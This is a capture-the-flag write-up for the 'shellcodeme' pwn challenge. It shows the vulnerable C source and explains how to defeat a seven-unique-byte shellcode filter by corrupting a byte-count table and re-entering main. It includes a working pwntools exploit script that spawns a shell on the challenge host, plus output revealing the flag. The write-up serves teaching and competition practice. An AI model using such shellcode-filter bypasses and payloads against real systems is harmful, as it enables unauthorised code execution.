{"pageContext":{"html":"<p><a href=\"ctf=blaze-2018\"></a>\n<a href=\"type=exploit\"></a>\n<a href=\"tags=game\"></a>\n<a href=\"techniques=shellcode\"></a></p>\n<h1>shellcodeme (pwn-420)</h1>\n<pre><code>Can you please smoke this?\n\nnc shellcodeme.420blaze.in 420\n\nAuthor : aweinstock\n\nSolves : ~60\n</code></pre>\n<p>This challenge had a hard version too. The way I exploited this chall worked in the hard one too. So 2 flags for the work of one.\nSource code was provided.</p>\n<pre><code class=\"language-c\">// gcc -zexecstack -Os shellcodeme.c -o shellcodeme\n#include &#x3C;stdio.h>\n#include &#x3C;string.h>\n#include &#x3C;sys/mman.h>\n#include &#x3C;unistd.h>\n\n#define BUF_SIZE (0x4096 &#x26; ~(getpagesize()-1))\n\nint main() {\n    setbuf(stdout, NULL);\n    unsigned char seen[257], *p, *buf;\n    void (*f)(void);\n    memset(seen, 0, sizeof seen);\n    buf = mmap(0, BUF_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    puts(\"Shellcode?\");\n    fgets(buf, BUF_SIZE, stdin);\n    fflush(stdin);\n    for(p=buf; *p != '\\n'; p++) {\n        seen[256] += !seen[*p];\n        seen[*p] |= 1;\n    }\n    if(seen[256] > 7) {\n        puts(\"Shellcode too diverse.\");\n        _exit(1);\n    } else {\n        *(void**)(&#x26;f) = (void*)buf;\n        f();\n        _exit(0);\n    }\n}\n</code></pre>\n<p>4 rwx pages are mmaped on which we can copy our input(0x4000). The only catch is the shellcode can't contain more than 7 unique bytes.</p>\n<pre><code class=\"language-c\">for(p=buf; *p != '\\n'; p++) {\n        seen[256] += !seen[*p];\n        seen[*p] |= 1;\n    }\n</code></pre>\n<p>This code iterates through each input byte and sums up the number of unique bytes in the shellcode. The <code>seen</code> table is very important for my strategy of exploitation.</p>\n<p><img src=\"jmp.png\" alt=\"jmp\"></p>\n<p>At <code>0x40072d</code> the control is transferred to rbp using a <code>call</code>. I first tried to look at the context on that state and then use the registers to make a read <code>syscall</code> on an rwx page in the libc. However with the restriction in place I could not successfully jump to the page.</p>\n<p>The next thought I had was to restart the execution of main such that we can bypass the check in place.</p>\n<p><img src=\"exp.png\" alt=\"exp\"></p>\n<p>As I noticed that <code>memset</code> operation is done on <code>0x400699</code>, once the <code>seen</code> table has initialized we can skip doing it again in the second run. Jumping to anywhere after the memset operation should work. If we are able to corrupt the 256 byte count table in a way that unique count calculated is in our control then that would let us run arbirary code in the next run. So in the first run we can execute 'push' to setup the stack in such a way that seen[256] is overflowed back to &#x3C; 7 in the next run.</p>\n<p>Here's how I did it in 7 unique bytes:</p>\n<ul>\n<li><code>pop</code> the saved rip from the stack to a register(rbx) (+1 unique byte)</li>\n<li><code>dec</code> the 32bit variant of that register to make it 0x4006d2  (+2 unique bytes)</li>\n<li>spray the stack by <code>push</code>ing the register to setup an already filled <code>seen</code>  (+1 unique bytes)</li>\n<li><code>inc rsp</code> to align <code>seen[256]</code> with 0xd2. will overflow this in the next run  (+2 unique bytes)</li>\n<li><code>ret</code> to get input again to the same page  (+1 unique bytes)</li>\n<li>input a shellcode such that seen[256] is overflowed back to 0</li>\n</ul>\n<pre><code>from pwn import *\n\ncontext(arch='amd64', os='linux', log_level='info')\n\npayload = asm(\"pop rbx; \"+(\"dec rbx; \"*(0x72f-0x6d2))+(\"push rbx; \"*64)+\"inc rsp; jmp rbx\")\npayload2 = asm(shellcraft.amd64.linux.sh())+\"\".join(map(chr, range(100,157)))\n\ns = remote(\"shellcodeme.420blaze.in\",420)\nraw_input()\n\ns.sendline(payload)\ns.sendline(payload2)\n\ns.interactive()\ns.close()\n</code></pre>\n<p>Output</p>\n<pre><code class=\"language-bash\">$ python shellcodeme.py \n[+] Opening connection to shellcodeme.420blaze.in on port 420: Done\n\n[*] Switching to interactive mode\nShellcode?\n$ id\nuid=1000(shellcodeme) gid=1000(shellcodeme) groups=1000(shellcodeme)\n$ cat flag\nblaze{g0lf3d_y0ur_sh3llc0d3's_un1qu3_byt3z}\n$ \n[*] Closed connection to shellcodeme.420blaze.in port 420\n</code></pre>"}}